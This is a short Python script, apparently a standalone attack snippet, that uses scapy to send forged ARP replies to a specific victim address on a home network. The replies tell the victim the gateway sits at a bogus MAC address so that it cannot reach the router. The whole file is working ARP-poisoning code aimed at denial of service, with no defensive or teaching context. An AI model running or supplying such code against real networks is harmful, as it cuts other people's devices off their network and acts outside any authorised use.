# Spoof the victim so it cannot reach the router anymore
from scapy.all import ARP, Ether, sendp

victim_ip = "192.168.178.25"
victim_mac = "8c:e9:ee:1e:e8:f8"
gateway_ip = "192.168.178.1"
bogus_mac = "de:ad:be:ef:de:ad"

# ARP reply: "gateway_ip is at bogus_mac"
arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=bogus_mac)
eth = Ether(dst=victim_mac, src=bogus_mac)
pkt = eth/arp

for i in range(10):
    sendp(pkt, verbose=1)
    print(f"Sent ARP poison to {victim_ip}")
